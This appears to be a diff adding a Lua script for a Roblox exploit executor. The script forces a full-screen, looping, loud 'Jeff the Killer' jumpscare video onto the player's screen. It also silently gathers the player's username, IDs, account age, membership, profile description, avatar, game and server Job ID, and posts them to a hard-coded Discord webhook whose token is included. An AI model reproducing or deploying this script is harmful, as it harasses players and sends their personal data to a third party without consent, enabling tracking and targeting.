@@ -1,0 +1,92 @@
+if getgenv().jumpscare_jeffwuz_loaded or _G.jumpscarefucking123 == true then
+	warn("Already Loaded.")
+	return
+end
+
+getgenv().jumpscare_jeffwuz_loaded = true
+getgenv().Notify = true
+
+local Notify_Webhook = "https://discord.com/api/webhooks/1384297323936612503/pDnaluJzeB_FdfRUMAK1qc7XQhNsfDi_Cm80EBcwJuO3DV55Djq0YCb1Mh6FFvdXfPt7"
+local getcustomasset = getsynasset or getcustomasset
+local request = request or http_request or syn.request
+
+if not getcustomasset then
+	warn("getcustomasset غير مدعوم.")
+	return
+end
+
+local player = game:GetService("Players").LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+-- GUI
+local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
+gui.IgnoreGuiInset = true
+gui.Name = "JeffTheKillerWuzHere"
+
+local video = Instance.new("VideoFrame", gui)
+video.Size = UDim2.new(1, 0, 1, 0)
+video.Looped = true
+video.Volume = 10
+video.Playing = true
+
+-- فيديو
+local path = "yes.mp4"
+if not isfile(path) then
+	writefile(path, game:HttpGet("https://cdn.discordapp.com/attachments/XXXX/yourvideo.mp4"))
+end
+video.Video = getcustomasset(path)
+
+-- Webhook
+local function notify_hook()
+	local thumbnail = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true")
+	local thumbJSON = HttpService:JSONDecode(thumbnail)
+	local avatarURL = thumbJSON.data[1].imageUrl
+
+	local userinfo = HttpService:JSONDecode(game:HttpGet("https://users.roproxy.com/v1/users/"..player.UserId))
+	local createdDate = string.match(userinfo.created, "^([%d-]+)")
+	local desc = userinfo.description
+
+	local data = {
+		["username"] = "Jumpscare Notify",
+		["avatar_url"] = "https://static.wikia.nocookie.net/19dbe80e-0ae6-48c7-98c7-3c32a39b2d7c/scale-to-width/370",
+		["content"] = "Jeff Wuz Here !",
+		["embeds"] = {{
+			["title"] = "Jeff's Log",
+			["description"] = "**Game : https://www.roblox.com/games/"..game.PlaceId.."**\n**Profile : https://www.roblox.com/users/"..player.UserId.."/profile**\n**Job ID : "..game.JobId.."**",
+			["color"] = 4915083,
+			["fields"] = {
+				{["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
+				{["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
+				{["name"] = "User ID", ["value"] = player.UserId, ["inline"] = true},
+				{["name"] = "Account Age", ["value"] = player.AccountAge.." Day", ["inline"] = true},
+				{["name"] = "Membership", ["value"] = player.MembershipType.Name, ["inline"] = true},
+				{["name"] = "Created Date", ["value"] = createdDate, ["inline"] = true},
+				{["name"] = "Description", ["value"] = "```\n"..desc.."\n```", ["inline"] = false}
+			},
+			["footer"] = {
+				["text"] = "JTK Log",
+				["icon_url"] = "https://miro.medium.com/v2/resize:fit:1280/0*c6-eGC3Dd_3HoF-B"
+			},
+			["thumbnail"] = {
+				["url"] = avatarURL
+			}
+		}}
+	}
+
+	local headers = {
+		["Content-Type"] = "application/json"
+	}
+
+	pcall(function()
+		request({
+			Url = Notify_Webhook,
+			Method = "POST",
+			Headers = headers,
+			Body = HttpService:JSONEncode(data)
+		})
+	end)
+end
+
+if getgenv().Notify and Notify_Webhook ~= "" then
+	notify_hook()
+end
